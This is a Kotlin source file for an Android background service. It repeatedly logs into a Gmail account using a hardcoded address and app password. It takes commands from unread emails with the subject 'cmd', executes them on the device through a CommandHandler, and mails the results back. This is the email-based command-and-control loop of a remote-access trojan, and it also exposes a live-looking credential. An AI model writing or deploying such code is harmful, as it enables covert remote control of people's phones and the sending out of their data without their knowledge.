package com.tom.app
import android.app.*
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.lifecycle.LifecycleService
import kotlinx.coroutines.*
import java.io.File
import java.util.Properties
import javax.mail.*
import javax.mail.internet.*
import javax.mail.search.SubjectTerm

class MailService : LifecycleService() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var job: Job? = null
    private val EMAIL = "cxzvo2007@gmail.com"
    private val PASS  = "xijk phhx imxv usob"

    override fun onCreate() { super.onCreate(); startForeground(1, buildNotification()) }
    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        super.onStartCommand(i, f, s)
        if (job == null) job = scope.launch { loop() }
        return START_STICKY
    }
    private suspend fun loop() {
        while (isActive) {
            try { poll() } catch (_: Exception) {}
            delay((20_000..40_000).random().toLong())
        }
    }
    private fun session(): Session {
        val p = Properties().apply {
            put("mail.store.protocol", "imaps")
            put("mail.smtp.host", "smtp.gmail.com")
            put("mail.smtp.port", "587")
            put("mail.smtp.auth", "true")
            put("mail.smtp.starttls.enable", "true")
        }
        return Session.getInstance(p, object : Authenticator() {
            override fun getPasswordAuthentication() = PasswordAuthentication(EMAIL, PASS)
        })
    }
    private fun poll() {
        val store = session().getStore("imaps")
        store.connect("imap.gmail.com", EMAIL, PASS)
        val inbox = store.getFolder("INBOX").apply { open(Folder.READ_WRITE) }
        val msgs = inbox.search(SubjectTerm("cmd"))
        val handler = CommandHandler(this)
        for (m in msgs) {
            if (m.isSet(Flags.Flag.SEEN)) continue
            val body = if (m.isMimeType("text/plain")) m.content.toString() else null
            if (body != null) {
                val result = try { handler.execute(body.trim()) } catch (e: Exception) { "ERR" }
                reply(result)
                m.setFlag(Flags.Flag.SEEN, true)
            }
        }
        inbox.close(false); store.close()
    }
    private fun reply(text: String) {
        val msg = MimeMessage(session()).apply {
            setFrom(InternetAddress(EMAIL))
            setRecipients(Message.RecipientType.TO, InternetAddress(EMAIL))
            subject = "res"
            setText(text)
        }
        Transport.send(msg)
    }
    private fun buildNotification(): Notification {
        val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= 26) nm.createNotificationChannel(NotificationChannel("c", "s", NotificationManager.IMPORTANCE_MIN))
        return Notification.Builder(this, "c").setContentTitle("TOM").setSmallIcon(android.R.drawable.stat_notify_sync).build()
    }
    override fun onBind(i: Intent): IBinder? { super.onBind(i); return null }
}
